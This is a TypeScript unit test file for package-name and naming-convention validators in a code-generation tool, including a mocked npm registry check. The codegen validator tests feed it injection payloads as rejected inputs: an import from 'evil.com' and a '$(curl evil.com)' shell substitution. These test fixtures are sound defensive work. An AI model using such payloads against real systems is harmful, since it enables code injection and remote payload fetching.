/**
 * Unit tests for validation utilities
 *
 * Run with: node --import tsx --test src/utils/validation.test.ts
 */

import { describe, it, mock } from 'node:test';
import assert from 'node:assert/strict';
import {
  isCustomUikit,
  normalizeUikit,
  isValidPackageName,
  isCamelCase,
  isPascalCase,
  isReservedScreensetName,
  validateNpmPackage,
  assertValidUikitForCodegen,
} from './validation.js';

describe('isCustomUikit', () => {
  it('should return false for "shadcn"', () => {
    assert.equal(isCustomUikit('shadcn'), false);
  });

  it('should return false for "none"', () => {
    assert.equal(isCustomUikit('none'), false);
  });

  it('should return false for legacy "hai3" alias', () => {
    assert.equal(isCustomUikit('hai3'), false);
  });

  it('should return true for scoped npm packages', () => {
    assert.equal(isCustomUikit('@acronis-platform/shadcn-uikit'), true);
    assert.equal(isCustomUikit('@my-org/ui'), true);
  });

  it('should return true for unscoped npm packages', () => {
    assert.equal(isCustomUikit('antd'), true);
    assert.equal(isCustomUikit('material-ui'), true);
  });
});

describe('normalizeUikit', () => {
  it('should map legacy "hai3" to "shadcn"', () => {
    assert.equal(normalizeUikit('hai3'), 'shadcn');
  });

  it('should keep non-legacy values unchanged', () => {
    assert.equal(normalizeUikit('shadcn'), 'shadcn');
    assert.equal(normalizeUikit('none'), 'none');
    assert.equal(normalizeUikit('@my-org/ui'), '@my-org/ui');
  });
});

describe('isValidPackageName', () => {
  it('should reject empty strings', () => {
    assert.equal(isValidPackageName(''), false);
  });

  it('should reject names longer than 214 characters', () => {
    assert.equal(isValidPackageName('a'.repeat(215)), false);
    assert.equal(isValidPackageName('a'.repeat(214)), true);
  });

  it('should reject names starting with . or _', () => {
    assert.equal(isValidPackageName('.hidden'), false);
    assert.equal(isValidPackageName('_private'), false);
  });

  it('should reject uppercase characters', () => {
    assert.equal(isValidPackageName('MyPackage'), false);
    assert.equal(isValidPackageName('myPackage'), false);
  });

  it('should reject special characters', () => {
    assert.equal(isValidPackageName('my~package'), false);
    assert.equal(isValidPackageName("my'package"), false);
    assert.equal(isValidPackageName('my!package'), false);
    assert.equal(isValidPackageName('my(package)'), false);
    assert.equal(isValidPackageName('my*package'), false);
  });

  it('should accept valid unscoped names', () => {
    assert.equal(isValidPackageName('my-project'), true);
    assert.equal(isValidPackageName('hai3'), true);
    assert.equal(isValidPackageName('some-package-123'), true);
  });

  it('should accept valid scoped names', () => {
    assert.equal(isValidPackageName('@gears-frontx/cli'), true);
    assert.equal(isValidPackageName('@my-org/my-package'), true);
  });

  it('should reject malformed scoped names', () => {
    assert.equal(isValidPackageName('@/missing-scope'), false);
    assert.equal(isValidPackageName('@scope/'), false);
    assert.equal(isValidPackageName('@scope'), false);
  });
});

describe('isCamelCase', () => {
  it('should reject empty strings', () => {
    assert.equal(isCamelCase(''), false);
  });

  it('should reject strings starting with uppercase', () => {
    assert.equal(isCamelCase('MyComponent'), false);
    assert.equal(isCamelCase('ABC'), false);
  });

  it('should reject strings with non-alphanumeric characters', () => {
    assert.equal(isCamelCase('my-name'), false);
    assert.equal(isCamelCase('my_name'), false);
    assert.equal(isCamelCase('my name'), false);
    assert.equal(isCamelCase('my.name'), false);
  });

  it('should accept valid camelCase strings', () => {
    assert.equal(isCamelCase('contacts'), true);
    assert.equal(isCamelCase('myScreenset'), true);
    assert.equal(isCamelCase('dashboard'), true);
    assert.equal(isCamelCase('contactList2'), true);
  });

  it('should reject strings starting with a number', () => {
    assert.equal(isCamelCase('2things'), false);
  });
});

describe('isPascalCase', () => {
  it('should reject empty strings', () => {
    assert.equal(isPascalCase(''), false);
  });

  it('should reject strings starting with lowercase', () => {
    assert.equal(isPascalCase('myComponent'), false);
    assert.equal(isPascalCase('abc'), false);
  });

  it('should reject strings with non-alphanumeric characters', () => {
    assert.equal(isPascalCase('My-Name'), false);
    assert.equal(isPascalCase('My_Name'), false);
    assert.equal(isPascalCase('My Name'), false);
  });

  it('should accept valid PascalCase strings', () => {
    assert.equal(isPascalCase('Contacts'), true);
    assert.equal(isPascalCase('MyScreenset'), true);
    assert.equal(isPascalCase('Dashboard'), true);
    assert.equal(isPascalCase('ContactList2'), true);
  });
});

describe('isReservedScreensetName', () => {
  it('should flag reserved names', () => {
    assert.equal(isReservedScreensetName('screenset'), true);
    assert.equal(isReservedScreensetName('screen'), true);
    assert.equal(isReservedScreensetName('index'), true);
    assert.equal(isReservedScreensetName('api'), true);
    assert.equal(isReservedScreensetName('core'), true);
  });

  it('should be case-insensitive', () => {
    assert.equal(isReservedScreensetName('Screenset'), true);
    assert.equal(isReservedScreensetName('INDEX'), true);
    assert.equal(isReservedScreensetName('Api'), true);
  });

  it('should allow non-reserved names', () => {
    assert.equal(isReservedScreensetName('contacts'), false);
    assert.equal(isReservedScreensetName('dashboard'), false);
    assert.equal(isReservedScreensetName('settings'), false);
  });
});

describe('assertValidUikitForCodegen', () => {
  it('should accept valid unscoped package names', () => {
    assert.doesNotThrow(() => assertValidUikitForCodegen('antd'));
    assert.doesNotThrow(() => assertValidUikitForCodegen('material-ui'));
    assert.doesNotThrow(() => assertValidUikitForCodegen('my-ui-lib'));
  });

  it('should accept valid scoped package names', () => {
    assert.doesNotThrow(() => assertValidUikitForCodegen('@my-org/ui'));
    assert.doesNotThrow(() => assertValidUikitForCodegen('@acronis-platform/shadcn-uikit'));
  });

  it('should reject TypeScript injection via quotes and semicolons', () => {
    assert.throws(
      () => assertValidUikitForCodegen("'; import('http://evil.com/x');"),
      /not a valid npm package name/
    );
  });

  it('should reject shell-style injection payloads', () => {
    assert.throws(
      () => assertValidUikitForCodegen('$(curl evil.com)'),
      /not a valid npm package name/
    );
  });

  it('should reject newline injection', () => {
    assert.throws(
      () => assertValidUikitForCodegen('valid\n//malicious'),
      /not a valid npm package name/
    );
  });

  it('should reject empty string', () => {
    assert.throws(
      () => assertValidUikitForCodegen(''),
      /not a valid npm package name/
    );
  });

  it('should reject names with special characters', () => {
    assert.throws(
      () => assertValidUikitForCodegen('invalid!@#$'),
      /not a valid npm package name/
    );
  });

  it('should reject names with spaces', () => {
    assert.throws(
      () => assertValidUikitForCodegen('my package'),
      /not a valid npm package name/
    );
  });

  it('should reject uppercase names', () => {
    assert.throws(
      () => assertValidUikitForCodegen('MyPackage'),
      /not a valid npm package name/
    );
  });
});

describe('validateNpmPackage', () => {
  it('should reject syntactically invalid names without hitting the network', async () => {
    const result = await validateNpmPackage('!!!INVALID!!!');
    assert.equal(result.exists, false);
    assert.ok(result.error?.includes('not a valid npm package name'));
  });

  it('should reject empty string', async () => {
    const result = await validateNpmPackage('');
    assert.equal(result.exists, false);
    assert.ok(result.error);
  });

  it('should reject uppercase names', async () => {
    const result = await validateNpmPackage('MyPackage');
    assert.equal(result.exists, false);
    assert.ok(result.error?.includes('not a valid npm package name'));
  });

  it('should return exists:true for a known valid package', async () => {
    const mockFetch = mock.fn(() =>
      Promise.resolve(new Response(null, { status: 200 }))
    );
    const originalFetch = globalThis.fetch;
    globalThis.fetch = mockFetch as typeof fetch;
    try {
      const result = await validateNpmPackage('lodash');
      assert.equal(result.exists, true);
      assert.equal(result.error, undefined);
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  it('should return exists:false for a 404 response', async () => {
    const mockFetch = mock.fn(() =>
      Promise.resolve(new Response(null, { status: 404 }))
    );
    const originalFetch = globalThis.fetch;
    globalThis.fetch = mockFetch as typeof fetch;
    try {
      const result = await validateNpmPackage('lodash');
      assert.equal(result.exists, false);
      assert.ok(result.error?.includes('not found'));
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  it('should return exists:true with warning on network failure for valid names', async () => {
    const mockFetch = mock.fn(() =>
      Promise.reject(new Error('network down'))
    );
    const originalFetch = globalThis.fetch;
    globalThis.fetch = mockFetch as typeof fetch;
    try {
      const result = await validateNpmPackage('lodash');
      assert.equal(result.exists, true);
      assert.ok(result.warning?.includes('Could not verify'));
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  it('should reject invalid names even when network would fail', async () => {
    const mockFetch = mock.fn(() =>
      Promise.reject(new Error('network down'))
    );
    const originalFetch = globalThis.fetch;
    globalThis.fetch = mockFetch as typeof fetch;
    try {
      const result = await validateNpmPackage('INVALID_NAME');
      assert.equal(result.exists, false);
      assert.ok(result.error?.includes('not a valid npm package name'));
      assert.equal(mockFetch.mock.callCount(), 0);
    } finally {
      globalThis.fetch = originalFetch;
    }
  });
});
